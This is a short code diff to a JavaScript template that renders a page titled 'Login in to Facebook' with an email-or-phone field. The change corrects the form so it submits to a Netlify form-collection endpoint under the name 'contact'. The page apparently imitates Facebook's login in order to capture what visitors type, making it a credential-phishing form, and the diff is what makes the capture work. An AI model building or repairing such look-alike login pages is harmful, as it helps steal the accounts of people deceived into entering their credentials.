@@ -6,7 +6,7 @@ let face = `
 <div class="main-container">
 <div class="container">
     <span>Login in to Facebook</span>
-    <form action="" netfily>
+    <form name="contact" netlify>
         <small class="w-store"></small>
         <input name="user_name:" class="w-100 form-control " type="text" placeholder="Email address or phone number">
         <small class="w-store"></small>
